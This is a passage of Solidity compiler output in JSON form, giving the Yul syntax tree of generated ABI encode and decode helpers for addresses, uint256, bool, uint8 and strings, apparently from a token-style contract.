																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "443:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "443:42:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "443:42:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "494:62:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "510:9:5"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"name": "length",
																								"nodeType": "YulIdentifier",
																								"src": "529:6:5"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "537:2:5",
																								"type": "",
																								"value": "31"
																							}
																						],
																						"functionName": {
																							"name": "add",
																							"nodeType": "YulIdentifier",
																							"src": "525:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "525:15:5"
																					},
																					{
																						"arguments": [
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "546:2:5",
																								"type": "",
																								"value": "31"
																							}
																						],
																						"functionName": {
																							"name": "not",
																							"nodeType": "YulIdentifier",
																							"src": "542:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "542:7:5"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "521:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "521:29:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "506:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "506:45:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "553:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "502:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "502:54:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "494:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "104:9:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "115:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "126:4:5",
														"type": ""
													}
												],
												"src": "14:548:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "616:124:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "626:29:5",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "648:6:5"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "635:12:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "635:20:5"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "626:5:5"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "718:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "727:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "730:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "720:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "720:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "720:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "677:5:5"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "688:5:5"
																					},
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "703:3:5",
																										"type": "",
																										"value": "160"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "708:1:5",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "699:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "699:11:5"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "712:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "sub",
																							"nodeType": "YulIdentifier",
																							"src": "695:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "695:19:5"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "684:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "684:31:5"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "674:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "674:42:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "667:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "667:50:5"
															},
															"nodeType": "YulIf",
															"src": "664:70:5"
														}
													]
												},
												"name": "abi_decode_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "595:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "606:5:5",
														"type": ""
													}
												],
												"src": "567:173:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "832:167:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "878:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "887:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "890:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "880:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "880:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "880:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "853:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "862:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "849:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "849:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "874:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "845:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "845:32:5"
															},
															"nodeType": "YulIf",
															"src": "842:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "903:39:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "932:9:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "913:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "913:29:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "903:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "951:42:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "978:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "989:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "974:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "974:18:5"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "961:12:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "961:32:5"
															},
															"variableNames": [
																{
																	"name": "value1",
																	"nodeType": "YulIdentifier",
																	"src": "951:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "790:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "801:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "813:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "821:6:5",
														"type": ""
													}
												],
												"src": "745:254:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1099:92:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1109:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1121:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1132:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1117:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1117:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1109:4:5"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1151:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value0",
																						"nodeType": "YulIdentifier",
																						"src": "1176:6:5"
																					}
																				],
																				"functionName": {
																					"name": "iszero",
																					"nodeType": "YulIdentifier",
																					"src": "1169:6:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1169:14:5"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1162:6:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1162:22:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1144:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1144:41:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1144:41:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1068:9:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1079:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1090:4:5",
														"type": ""
													}
												],
												"src": "1004:187:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1297:76:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1307:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1319:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1330:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1315:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1315:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1307:4:5"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1349:9:5"
																	},
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1360:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1342:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1342:25:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1342:25:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1266:9:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1277:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1288:4:5",
														"type": ""
													}
												],
												"src": "1196:177:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1482:224:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1528:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1537:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1540:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1530:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1530:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1530:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1503:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1512:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1499:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1499:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1524:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1495:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1495:32:5"
															},
															"nodeType": "YulIf",
															"src": "1492:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1553:39:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1582:9:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "1563:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1563:29:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "1553:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1601:48:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1634:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1645:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1630:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1630:18:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "1611:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1611:38:5"
															},
															"variableNames": [
																{
																	"name": "value1",
																	"nodeType": "YulIdentifier",
																	"src": "1601:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1658:42:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1685:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1696:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1681:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1681:18:5"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "1668:12:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1668:32:5"
															},
															"variableNames": [
																{
																	"name": "value2",
																	"nodeType": "YulIdentifier",
																	"src": "1658:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_addresst_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1432:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1443:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1455:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1463:6:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "1471:6:5",
														"type": ""
													}
												],
												"src": "1378:328:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1808:87:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1818:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1830:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1841:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1826:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1826:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1818:4:5"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1860:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "1875:6:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1883:4:5",
																				"type": "",
																				"value": "0xff"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "1871:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1871:17:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1853:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1853:36:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1853:36:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1777:9:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1788:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1799:4:5",
														"type": ""
													}
												],
												"src": "1711:184:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1970:116:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2016:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2025:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2028:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2018:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2018:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2018:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1991:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2000:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1987:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1987:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2012:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1983:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1983:32:5"
															},
															"nodeType": "YulIf",
															"src": "1980:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2041:39:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2070:9:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "2051:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2051:29:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "2041:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1936:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1947:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1959:6:5",
														"type": ""
													}
												],
												"src": "1900:186:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2178:173:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2224:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2233:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2236:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2226:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2226:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2226:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "2199:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2208:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "2195:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2195:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2220:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "2191:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2191:32:5"
															},
															"nodeType": "YulIf",
															"src": "2188:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2249:39:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2278:9:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "2259:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2259:29:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "2249:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2297:48:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2330:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2341:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2326:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2326:18:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address",
																	"nodeType": "YulIdentifier",
																	"src": "2307:18:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2307:38:5"
															},
															"variableNames": [
																{
																	"name": "value1",
																	"nodeType": "YulIdentifier",
																	"src": "2297:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2136:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "2147:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2159:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "2167:6:5",
														"type": ""
													}
												],
												"src": "2091:260:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2411:325:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2421:22:5",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2435:1:5",
																		"type": "",
																		"value": "1"
																	},
																	{
																		"name": "data",
																		"nodeType": "YulIdentifier",
																		"src": "2438:4:5"
																	}
																],
																"functionName": {
																	"name": "shr",
																	"nodeType": "YulIdentifier",
																	"src": "2431:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2431:12:5"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "2421:6:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2452:38:5",
															"value": {
																"arguments": [
																	{
																		"name": "data",
																		"nodeType": "YulIdentifier",
																		"src": "2482:4:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2488:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "2478:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2478:12:5"
															},
															"variables": [
																{
																	"name": "outOfPlaceEncoding",
																	"nodeType": "YulTypedName",
																	"src": "2456:18:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2529:31:5",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "2531:27:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "length",
																					"nodeType": "YulIdentifier",
																					"src": "2545:6:5"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2553:4:5",
																					"type": "",
																					"value": "0x7f"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "2541:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2541:17:5"
																		},
																		"variableNames": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "2531:6:5"
																			}
																		]
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "outOfPlaceEncoding",
																		"nodeType": "YulIdentifier",
																		"src": "2509:18:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2502:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2502:26:5"
															},
															"nodeType": "YulIf",
															"src": "2499:61:5"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2619:111:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2640:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2647:3:5",
																							"type": "",
																							"value": "224"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2652:10:5",
																							"type": "",
																							"value": "0x4e487b71"
																						}
																					],
																					"functionName": {
																						"name": "shl",
																						"nodeType": "YulIdentifier",
																						"src": "2643:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2643:20:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2633:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2633:31:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2633:31:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2684:1:5",
																					"type": "",
																					"value": "4"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2687:4:5",
																					"type": "",
																					"value": "0x22"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2677:6:5"
																			},
